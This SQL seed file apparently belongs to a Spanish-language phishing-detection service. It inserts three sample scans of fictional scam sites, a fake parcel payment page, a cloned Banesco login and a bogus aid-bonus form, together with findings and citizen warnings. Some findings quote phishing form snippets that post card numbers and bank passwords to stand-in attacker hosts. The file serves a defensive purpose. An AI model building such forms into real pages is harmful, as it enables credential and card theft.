-- ============================================================================
-- DATOS SEMILLA INICIALES: Alertas Comunitarias Verificadas para Portada
-- ============================================================================

INSERT OR IGNORE INTO users (id, alias, email, password_hash, plan_tier, is_active)
VALUES (
    'usr_01J9X00000SYSTEMGUARD36000',
    'CentinelaDetector360',
    'centinela@detector360.app',
    'pbkdf2_sha512$210000$00112233445566778899aabbccddeeff$system_locked_account_no_direct_login',
    'verified_merchant',
    1
);

INSERT OR IGNORE INTO scans (
    id, user_id, target_url, final_url, target_domain, protocol, http_status_code,
    redirect_count, has_hsts, has_csp, has_x_frame_options, risk_score, risk_level,
    citizen_verdict_title, citizen_verdict_summary, action_steps_json, source_preview_json,
    r2_snapshot_key, integrity_sha256, scan_duration_ms, created_at
) VALUES
(
    'scn_01J9SEED01PAQUETEXYZ000001',
    'usr_01J9X00000SYSTEMGUARD36000',
    'http://entrega-paquete-pendiente.ejemplo.xyz/pago',
    'http://entrega-paquete-pendiente.ejemplo.xyz/pago',
    'entrega-paquete-pendiente.ejemplo.xyz',
    'http', 200, 1, 0, 0, 0, 96, 'CRITICAL',
    'ALTO: Esta página es una trampa para robar tu tarjeta',
    'No tiene candado de seguridad HTTPS y envía los datos de tu tarjeta a un servidor desconocido.',
    '["Cierra esta página inmediatamente y no escribas ningún dato.","Si recibiste este enlace por SMS o WhatsApp, bloquea el número remitente.","Nunca pagues supuestos envíos retenidos desde enlaces recibidos por mensajes."]',
    '[{"line":41,"content":"<form id=\"card-payment\" action=\"http://cobro-externo-99.xyz/procesar.php\" method=\"POST\">","has_finding":true}]',
    'snapshots/scn_01J9SEED01PAQUETEXYZ000001.html',
    '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    540,
    strftime('%Y-%m-%dT%H:%M:%SZ', 'now', '-12 minutes')
),
(
    'scn_01J9SEED02BANESCOVERIF0002',
    'usr_01J9X00000SYSTEMGUARD36000',
    'http://banesco-verificacion-segura.ejemplo.xyz/login',
    'http://banesco-verificacion-segura.ejemplo.xyz/login',
    'banesco-verificacion-segura.ejemplo.xyz',
    'http', 200, 0, 0, 0, 0, 98, 'CRITICAL',
    'PELIGRO CRÍTICO: Portal bancario falso diseñado para robar tus claves',
    'Imita un acceso bancario sin cifrado y tiene un espía oculto que captura cada tecla que presionas.',
    '["Cierra la pestaña ahora mismo y no ingreses tu usuario ni contraseña.","Entra a tu banco únicamente escribiendo su dirección oficial o desde su app oficial.","Si ya escribiste tu clave, llama de inmediato a tu banco para bloquear el acceso."]',
    '[{"line":28,"content":"<form id=\"login-banco\" action=\"http://robo-datos.xyz/captura.php\" method=\"POST\">","has_finding":true}]',
    'snapshots/scn_01J9SEED02BANESCOVERIF0002.html',
    '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
    610,
    strftime('%Y-%m-%dT%H:%M:%SZ', 'now', '-29 minutes')
),
(
    'scn_01J9SEED03BONOAYUDA2026003',
    'usr_01J9X00000SYSTEMGUARD36000',
    'http://bono-ayuda-nacional-2026.ejemplo.xyz/registro',
    'http://bono-ayuda-nacional-2026.ejemplo.xyz/registro',
    'bono-ayuda-nacional-2026.ejemplo.xyz',
    'http', 200, 2, 0, 0, 0, 91, 'CRITICAL',
    'ALTO: Falso bono económico que roba tu cédula y clave bancaria',
    'Solicita documento de identidad y contraseña bancaria sobre una conexión abierta sin protección.',
    '["No compartas este enlace en grupos familiares de WhatsApp.","Ningún organismo oficial pide la contraseña de tu banco para entregar una ayuda.","Elimina el mensaje para proteger a tus contactos."]',
    '[{"line":52,"content":"<input type=\"text\" name=\"clave_bancaria\" placeholder=\"Clave de acceso al banco\">","has_finding":true}]',
    'snapshots/scn_01J9SEED03BONOAYUDA2026003.html',
    'ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d',
    490,
    strftime('%Y-%m-%dT%H:%M:%SZ', 'now', '-47 minutes')
);

INSERT OR IGNORE INTO scan_findings (
    id, scan_id, rule_code, category, severity, line_number, column_number,
    dom_selector, citizen_explanation, technical_detail, code_snippet
) VALUES
(
    'fnd_01J9SEED01A',
    'scn_01J9SEED01PAQUETEXYZ000001',
    'INSECURE_HTTP_SENSITIVE_FORM',
    'DOM_FORM',
    'CRITICAL',
    41, 5,
    'form#card-payment',
    'Este formulario pide el número de tu tarjeta y código CVV sin cifrado; viajan abiertos por internet como una postal sin sobre.',
    'Formulario con campos de tarjeta financiera transmitidos sobre HTTP plano sin cifrado TLS.',
    '<form id="card-payment" action="http://cobro-externo-99.xyz/procesar.php" method="POST">'
),
(
    'fnd_01J9SEED02A',
    'scn_01J9SEED02BANESCOVERIF0002',
    'CROSS_DOMAIN_FORM_ACTION',
    'DOM_FORM',
    'CRITICAL',
    28, 5,
    'form#login-banco',
    'Aunque parece la página de tu banco, al pulsar Entrar envía tu clave en secreto a otro servidor pirata (robo-datos.xyz).',
    'El atributo action del formulario apunta a un dominio externo distinto al host de origen.',
    '<form id="login-banco" action="http://robo-datos.xyz/captura.php" method="POST">'
),
(
    'fnd_01J9SEED03A',
    'scn_01J9SEED03BONOAYUDA2026003',
    'PLAINTEXT_PASSWORD_INPUT',
    'DOM_INPUT',
    'HIGH',
    52, 7,
    'input[name="clave_bancaria"]',
    'El campo donde te piden la clave bancaria ni siquiera oculta las letras y viaja sin protección.',
    'Input con nombre asociado a credenciales bancarias declarado como type="text" sobre HTTP.',
    '<input type="text" name="clave_bancaria" placeholder="Clave de acceso al banco">'
);

INSERT OR IGNORE INTO community_alerts (
    id, scan_id, reported_by_user_id, target_domain, risk_score,
    threat_category_label, channel_received, status, created_at
) VALUES
(
    'alt_01J9XB01',
    'scn_01J9SEED01PAQUETEXYZ000001',
    'usr_01J9X00000SYSTEMGUARD36000',
    'entrega-paquete-pendiente.ejemplo.xyz',
    96,
    'Robo de Tarjeta sin Cifrado HTTP',
    'sms',
    'published',
    strftime('%Y-%m-%dT%H:%M:%SZ', 'now', '-11 minutes')
),
(
    'alt_01J9XB02',
    'scn_01J9SEED02BANESCOVERIF0002',
    'usr_01J9X00000SYSTEMGUARD36000',
    'banesco-verificacion-segura.ejemplo.xyz',
    98,
    'Portal Bancario Clonado + Keylogger JS',
    'whatsapp',
    'published',
    strftime('%Y-%m-%dT%H:%M:%SZ', 'now', '-28 minutes')
),
(
    'alt_01J9XB03',
    'scn_01J9SEED03BONOAYUDA2026003',
    'usr_01J9X00000SYSTEMGUARD36000',
    'bono-ayuda-nacional-2026.ejemplo.xyz',
    91,
    'Falso Bono Social (Exfiltración de Claves)',
    'whatsapp',
    'published',
    strftime('%Y-%m-%dT%H:%M:%SZ', 'now', '-46 minutes')
);
